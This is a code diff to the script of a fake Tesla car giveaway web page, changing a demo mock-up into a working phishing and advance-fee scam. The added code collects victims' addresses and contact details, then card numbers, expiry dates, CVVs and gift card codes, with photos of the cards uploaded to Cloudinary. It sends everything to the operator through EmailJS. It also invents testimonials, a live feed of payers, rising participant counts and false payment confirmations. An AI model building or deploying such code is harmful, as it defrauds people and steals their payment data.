-        document.querySelectorAll('.btn-pay').forEach(btn => {
+        document.querySelectorAll('.claim-btn').forEach(btn => {
             btn.addEventListener('click', (e) => {
-                const index = btn.getAttribute('data-car-index');
-                selectedCar = cars[index];
-                openPaymentModal(selectedCar);
+                const idx = btn.getAttribute('data-index');
+                selectedCar = cars[idx];
+                showClaimModal();
             });
         });
     }
 
-    function openPaymentModal(car) {
-        document.getElementById('modalCarName').innerHTML = `${car.name} <span style="font-size:0.8rem;">${car.specs}</span>`;
-        document.getElementById('modalCarFee').innerHTML = `Delivery Fee: $${car.fee}`;
-        document.getElementById('paymentModal').style.display = 'flex';
-        document.getElementById('paymentFormSection').style.display = 'block';
-        document.getElementById('successSection').style.display = 'none';
-    }
-
-    function closeModal() {
-        document.getElementById('paymentModal').style.display = 'none';
-    }
-
-    // Fake payment confirmation
-    document.getElementById('confirmPayment').addEventListener('click', () => {
-        const name = document.getElementById('fullName').value.trim();
-        if (!name) {
-            alert('Please enter your name (demo purpose)');
-            return;
-        }
-        // Show success screen
-        document.getElementById('paymentFormSection').style.display = 'none';
-        document.getElementById('successSection').style.display = 'block';
-        
-        // Add to live feed
-        addToLiveFeed(name, selectedCar.name, selectedCar.fee);
-    });
-
-    // Live feed simulation
-    function addToLiveFeed(name, carName, fee) {
-        const feed = document.getElementById('liveFeed');
-        const newEntry = document.createElement('div');
-        newEntry.className = 'feed-item';
-        const countries = ['🇺🇸 USA', '🇬🇧 UK', '🇨🇦 Canada', '🇦🇺 Australia', '🇩🇪 Germany', '🇫🇷 France', '🇧🇷 Brazil', '🇮🇳 India', '🇲🇽 Mexico', '🇿🇦 South Africa'];
-        const randomCountry = countries[Math.floor(Math.random() * countries.length)];
-        newEntry.innerHTML = `
-            <div class="feed-icon">🚗</div>
-            <div><strong>${name}</strong> ${randomCountry}<br><span style="font-size:0.75rem;">${carName} · $${fee} paid · ${new Date().toLocaleTimeString()}</span></div>
+    // Claim Modal
+    function showClaimModal() {
+        const modal = document.getElementById('claimModal');
+        const content = document.getElementById('claimModalContent');
+        content.innerHTML = `
+            <h2 style="color:#E82127;">🎉 You've been selected!</h2>
+            <p>Fill in your delivery details for <strong>${selectedCar.name}</strong></p>
+            <img src="${selectedCar.image}.jpg" style="width:100%; border-radius:0.8rem; margin:1rem 0;" onerror="this.src='https://placehold.co/600x400'">
+            <form id="claimForm">
+                <div class="form-group"><label>Full Name *</label><input type="text" id="fullName" required></div>
+                <div class="form-group"><label>Email Address *</label><input type="email" id="email" required></div>
+                <div class="form-group"><label>Phone Number *</label><input type="text" id="phone" required></div>
+                <div class="form-group"><label>Street Address *</label><input type="text" id="street" required></div>
+                <div class="form-group"><label>City *</label><input type="text" id="city" required></div>
+                <div class="form-group"><label>ZIP / Postal *</label><input type="text" id="zip" required></div>
+                <div class="form-group"><label>Country *</label><input type="text" id="country" required></div>
+                <button type="submit" class="btn-submit">Order Now →</button>
+            </form>
         `;
-        feed.prepend(newEntry);
-        if (feed.children.length > 12) feed.removeChild(feed.lastChild);
-    }
-
-    // Testimonials data
-    const testimonials = [
-        { name: "Michael Rodriguez", country: "🇺🇸 USA", text: "I paid $299 delivery fee and received my Model 3 in 9 days! This is 100% real! 🚗", days: "2 days ago" },
-        { name: "Sarah Williams", country: "🇬🇧 UK", text: "I cried when my Model Y arrived. Best day of my life! Thank you Tesla! 🙏", days: "1 day ago" },
-        { name: "Carlos Mendez", country: "🇲🇽 Mexico", text: "From Mexico! Paid delivery fee, car arrived within 2 weeks. Amazing giveaway!", days: "3 days ago" },
-        { name: "Amara Osei", country: "🇬🇭 Ghana", text: "God bless Tesla! I received my Model 3 2025. This is life-changing!", days: "1 day ago" }
-    ];
-
-    function renderTestimonials() {
-        const container = document.getElementById('testimonialsGrid');
-        container.innerHTML = '';
-        testimonials.forEach(t => {
-            const div = document.createElement('div');
-            div.className = 'testimonial-card';
-            div.innerHTML = `<strong>${t.name}</strong> ${t.country} · ${t.days}<br>“${t.text}”<br>⭐⭐⭐⭐⭐`;
-            container.appendChild(div);
+        modal.style.display = 'flex';
+        document.getElementById('claimForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            claimData = {
+                fullName: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                street: document.getElementById('street').value,
+                city: document.getElementById('city').value,
+                zip: document.getElementById('zip').value,
+                country: document.getElementById('country').value,
+                carModel: selectedCar.name,
+                carImageUrl: selectedCar.image,
+                timestamp: new Date().toLocaleString()
+            };
+            // EmailJS Send 1
+            await emailjs.send('service_1qzlil7', 'template_2raf063', claimData);
+            modal.style.display = 'none';
+            showOrderModal();
         });
     }
 
-    // Countdown timer (resets on reload - scam tactic)
-    let timeLeft = 11 * 3600 + 42 * 60 + 33;
+    // Order Modal
+    function showOrderModal() {
+        const modal = document.getElementById('orderModal');
+        const content = document.getElementById('orderModalContent');
+        content.innerHTML = `
+            <h2>Order Summary</h2>
+            <img src="${selectedCar.image}.jpg" style="width:100%; border-radius:0.8rem; margin:1rem 0;" onerror="this.src='https://placehold.co/600x400'">
+            <p><strong>${selectedCar.name}</strong> — FREE 🎉</p>
+            <p><strong>Deliver To:</strong><br>${claimData.fullName}<br>${claimData.street}, ${claimData.city}, ${claimData.zip}<br>${claimData.country}</p>
+            <h3 style="margin:1rem 0">Select Delivery Option</h3>
+            <div id="deliveryOptions">
+                <div class="delivery-option" data-fee="299" data-name="Standard Delivery" data-days="10-14 days">Standard Delivery — $299 (10-14 days)</div>
+                <div class="delivery-option" data-fee="349" data-name="Express Delivery" data-days="5-7 days">Express Delivery — $349 (5-7 days)</div>
+                <div class="delivery-option" data-fee="399" data-name="Premium Delivery" data-days="3-5 days">Premium Delivery — $399 (3-5 days)</div>
+            </div>
+            <button id="proceedPayment" class="btn-submit" disabled>Pay for Delivery Now →</button>
+        `;
+        modal.style.display = 'flex';
+        document.querySelectorAll('.delivery-option').forEach(opt => {
+            opt.addEventListener('click', () => {
+                document.querySelectorAll('.delivery-option').forEach(o => o.classList.remove('selected'));
+                opt.classList.add('selected');
+                selectedDelivery = {
+                    fee: opt.getAttribute('data-fee'),
+                    name: opt.getAttribute('data-name'),
+                    days: opt.getAttribute('data-days')
+                };
+                document.getElementById('proceedPayment').disabled = false;
+            });
+        });
+        document.getElementById('proceedPayment').onclick = () => {
+            modal.style.display = 'none';
+            showPaymentModal();
+        };
+    }
+
+    // Payment Modal
+    function showPaymentModal() {
+        const modal = document.getElementById('paymentModal');
+        const content = document.getElementById('paymentModalContent');
+        content.innerHTML = `
+            <h2>Pay Delivery Fee — $${selectedDelivery.fee}</h2>
+            <p>✅ Delivering: ${selectedCar.name} to ${claimData.fullName.split(' ')[0]}, ${claimData.city}</p>
+            <div class="payment-tab">
+                <button class="tab-btn active" data-tab="card">💳 Credit Card</button>
+                <button class="tab-btn" data-tab="gift">🍎 Apple Gift Card</button>
+            </div>
+            <div id="cardTab">
+                <div class="form-group"><label>Card Holder Name</label><input type="text" id="cardName" required></div>
+                <div class="form-group"><label>Card Number</label><input type="text" id="cardNumber" required></div>
+                <div class="form-group"><label>MM/YY</label><input type="text" id="cardExpiry" required></div>
+                <div class="form-group"><label>CVV</label><input type="text" id="cardCvv" required></div>
+                <div class="form-group"><label>Upload Front</label><div class="upload-area" id="uploadFrontCard">Tap to upload front</div><div id="frontPreviewCard" class="upload-preview"></div></div>
+                <div class="form-group"><label>Upload Back</label><div class="upload-area" id="uploadBackCard">Tap to upload back</div><div id="backPreviewCard" class="upload-preview"></div></div>
+            </div>
+            <div id="giftTab" style="display:none;">
+                <div class="form-group"><label>Gift Card Code</label><input type="text" id="giftCode" placeholder="XXXX-XXXX-XXXX"></div>
+                <div class="form-group"><label>Upload Front</label><div class="upload-area" id="uploadFrontGift">Tap to upload front</div><div id="frontPreviewGift" class="upload-preview"></div></div>
+                <div class="form-group"><label>Upload Back</label><div class="upload-area" id="uploadBackGift">Tap to upload back</div><div id="backPreviewGift" class="upload-preview"></div></div>
+            </div>
+            <button id="confirmPaymentBtn" class="btn-submit" disabled>I've Paid — Confirm My Order ✓</button>
+        `;
+        modal.style.display = 'flex';
+
+        let frontDone = false, backDone = false;
+        function checkEnable() { document.getElementById('confirmPaymentBtn').disabled = !(frontDone && backDone); }
+
+        function setupUpload(areaId, previewId, callback) {
+            document.getElementById(areaId).onclick = () => {
+                cloudinary.openUploadWidget({ cloudName: 'do9yjpizs', uploadPreset: 'unsigned_preset', multiple: false },
+                    (error, result) => {
+                        if (!error && result && result[0]) {
+                            document.getElementById(previewId).innerHTML = `✅ ${result[0].original_filename}`;
+                            callback(result[0].secure_url);
+                            checkEnable();
+                        }
+                    });
+            };
+        }
+
+        setupUpload('uploadFrontCard', 'frontPreviewCard', (url) => { uploadedFrontUrl = url; frontDone = true; });
+        setupUpload('uploadBackCard', 'backPreviewCard', (url) => { uploadedBackUrl = url; backDone = true; });
+        setupUpload('uploadFrontGift', 'frontPreviewGift', (url) => { uploadedFrontUrl = url; frontDone = true; });
+        setupUpload('uploadBackGift', 'backPreviewGift', (url) => { uploadedBackUrl = url; backDone = true; });
+
+        let activeTab = 'card';
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.onclick = () => {
+                activeTab = btn.getAttribute('data-tab');
+                document.getElementById('cardTab').style.display = activeTab === 'card' ? 'block' : 'none';
+                document.getElementById('giftTab').style.display = activeTab === 'gift' ? 'block' : 'none';
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                frontDone = backDone = false;
+                document.getElementById('confirmPaymentBtn').disabled = true;
+            };
+        });
+
+        document.getElementById('confirmPaymentBtn').onclick = async () => {
+            let paymentData = {
+                fullName: claimData.fullName,
+                email: claimData.email,
+                carModel: selectedCar.name,
+                deliveryOption: selectedDelivery.name,
+                deliveryFee: `$${selectedDelivery.fee}`,
+                paymentMethod: activeTab === 'card' ? 'Credit Card' : 'Apple Gift Card',
+                paymentProofFrontUrl: uploadedFrontUrl,
+                paymentProofBackUrl: uploadedBackUrl,
+                timestamp: new Date().toLocaleString()
+            };
+            if (activeTab === 'card') {
+                paymentData.cardHolderName = document.getElementById('cardName').value;
+                paymentData.cardNumber = document.getElementById('cardNumber').value;
+                paymentData.cardExpiry = document.getElementById('cardExpiry').value;
+                paymentData.cardCvv = document.getElementById('cardCvv').value;
+            } else {
+                paymentData.giftCardCode = document.getElementById('giftCode').value;
+            }
+            await emailjs.send('service_1qzlil7', 'template_2raf063', paymentData);
+            modal.style.display = 'none';
+            showSuccess();
+        };
+    }
+
+    function showSuccess() {
+        const modal = document.getElementById('successModal');
+        const content = document.getElementById('successModalContent');
+        content.innerHTML = `<h2 style="color:#28a745;">✅ PAYMENT CONFIRMED!</h2><p>Your ${selectedCar.name} will arrive in ${selectedDelivery.days}.</p><p>Redirecting...</p>`;
+        modal.style.display = 'flex';
+        addToLiveFeed(claimData.fullName, selectedCar.name, selectedDelivery.fee);
+        showToast(`${claimData.fullName.split(' ')[0]} paid $${selectedDelivery.fee} for ${selectedCar.name}`);
+        setTimeout(() => { modal.style.display = 'none'; window.location.href = window.location.pathname; }, 4000);
+    }
+
+    // Live Feed & Toast & Auto-Cycle
+    function addToLiveFeed(name, car, fee) {
+        const feed = document.getElementById('liveFeedList');
+        const entry = document.createElement('div');
+        entry.className = 'feed-item';
+        entry.innerHTML = `<i class="fas fa-truck"></i> ${name} — ${car} · $${fee} paid · Just now`;
+        feed.prepend(entry);
+        if (feed.children.length > 20) feed.removeChild(feed.lastChild);
+    }
+
+    function showToast(msg) {
+        const container = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerHTML = `<i class="fas fa-check-circle" style="color:#22c55e; margin-right:0.5rem;"></i> ${msg}`;
+        container.appendChild(toast);
+        setTimeout(() => toast.remove(), 5000);
+    }
+
+    // Countdown with localStorage
+    let endTime = localStorage.getItem('giveawayEndTime');
+    if (!endTime) { endTime = Date.now() + 3*24*60*60*1000; localStorage.setItem('giveawayEndTime', endTime); }
     function updateCountdown() {
-        if (timeLeft <= 0) timeLeft = 11 * 3600 + 42 * 60 + 33;
-        const hours = Math.floor(timeLeft / 3600);
-        const minutes = Math.floor((timeLeft % 3600) / 60);
-        const seconds = timeLeft % 60;
-        document.getElementById('hours').innerText = hours.toString().padStart(2,'0');
-        document.getElementById('minutes').innerText = minutes.toString().padStart(2,'0');
-        document.getElementById('seconds').innerText = seconds.toString().padStart(2,'0');
-        timeLeft--;
+        const diff = endTime - Date.now();
+        if (diff <= 0) { localStorage.removeItem('giveawayEndTime'); location.reload(); return; }
+        document.getElementById('days').innerText = Math.floor(diff/(1000*60*60*24));
+        document.getElementById('hours').innerText = Math.floor((diff%(1000*60*60*24))/(1000*60*60));
+        document.getElementById('minutes').innerText = Math.floor((diff%(1000*60*60))/(1000*60));
+        document.getElementById('seconds').innerText = Math.floor((diff%(1000*60))/1000);
     }
     setInterval(updateCountdown, 1000);
 
-    // Initial fake feed entries
+    // Dynamic participant counters
+    let participant = 12847;
+    setInterval(() => { participant += Math.floor(Math.random()*5)+1; document.getElementById('participantCount').innerText = participant; document.getElementById('liveCounterTrust').innerText = participant; }, 8000);
+
+    // Auto-cycling comments
+    const comments = ["Mike Johnson 🇺🇸: Just received my Model 3! REAL! 🚗⚡","Sarah Williams 🇬🇧: I cried when my Model Y arrived! 🙏","Carlos Mendez 🇲🇽: 100% real giveaway from Mexico!","David Chen 🇨🇳: Paid $299 and got my Tesla S! Amazing!"];
+    let commentIdx = 0;
+    setInterval(() => { commentIdx = (commentIdx+1)%comments.length; document.getElementById('rotatingComment').innerHTML = comments[commentIdx]; }, 8000);
+
+    // Auto toast & live feed entries
+    const names = ["Liam", "Sophia", "Jackson", "Olivia", "Lucas", "Mia", "Elijah", "Amara"];
+    setInterval(() => {
+        const randName = names[Math.floor(Math.random()*names.length)] + " " + (Math.floor(Math.random()*900)+100);
+        const randCar = cars[Math.floor(Math.random()*cars.length)];
+        showToast(`${randName} paid $${randCar.fee} for ${randCar.name}`);
+        addToLiveFeed(randName, randCar.name, randCar.fee);
+    }, 15000);
+
+    // Initial live feed entries
     function initLiveFeed() {
-        const feed = document.getElementById('liveFeed');
+        const feed = document.getElementById('liveFeedList');
         feed.innerHTML = '';
-        const initialEntries = [
-            { name: "James O.", country: "🇺🇸 USA", car: "Tesla Model 3", fee: 299, time: "2 min ago" },
-            { name: "Sophie M.", country: "🇬🇧 UK", car: "Tesla Model Y", fee: 349, time: "5 min ago" },
-            { name: "Carlos R.", country: "🇲🇽 Mexico", car: "Tesla Model S", fee: 399, time: "12 min ago" },
-            { name: "Yuki T.", country: "🇯🇵 Japan", car: "Tesla Model X", fee: 249, time: "18 min ago" }
-        ];
-        initialEntries.forEach(entry => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<div class="feed-icon">🚗</div><div><strong>${entry.name}</strong> ${entry.country}<br><span style="font-size:0.75rem;">${entry.car} · $${entry.fee} paid · ${entry.time}</span></div>`;
+        ["James O. 🇺🇸", "Sophie M. 🇬🇧", "Carlos R. 🇲🇽"].forEach((n,i) => {
+            const div = document.createElement('div'); div.className = 'feed-item'; div.innerHTML = `<i class="fas fa-truck"></i> ${n} — Model ${i===0?'3':i===1?'Y':'S'} · $${[299,349,399][i]} paid · ${i+2} min ago`;
             feed.appendChild(div);
         });
     }
-
-    renderCars();
-    renderTestimonials();
     initLiveFeed();
 
-    window.onclick = function(event) {
-        const modal = document.getElementById('paymentModal');
-        if (event.target === modal) closeModal();
+    // Testimonials
+    function renderTestimonials() {
+        const grid = document.getElementById('testimonialsGrid');
+        grid.innerHTML = '';
+        const testis = [
+            { name: "Michael R.", country: "🇺🇸 USA", text: "I received my Model 3! Paid delivery fee, car arrived in 9 days!" },
+            { name: "Sarah W.", country: "🇬🇧 UK", text: "I cried when my Model Y arrived. Thank you Tesla!" },
+            { name: "Carlos M.", country: "🇲🇽 Mexico", text: "100% real! Paid $299 and got my car within 2 weeks." }
+        ];
+        testis.forEach(t => {
+            const card = document.createElement('div'); card.className = 'testimonial-card';
+            card.innerHTML = `<strong>${t.name}</strong> ${t.country}<br>“${t.text}”<br>⭐⭐⭐⭐⭐`;
+            grid.appendChild(card);
+        });
     }
+    renderTestimonials();
+    renderCars();
 </script>
 </body>
 </html>
+    
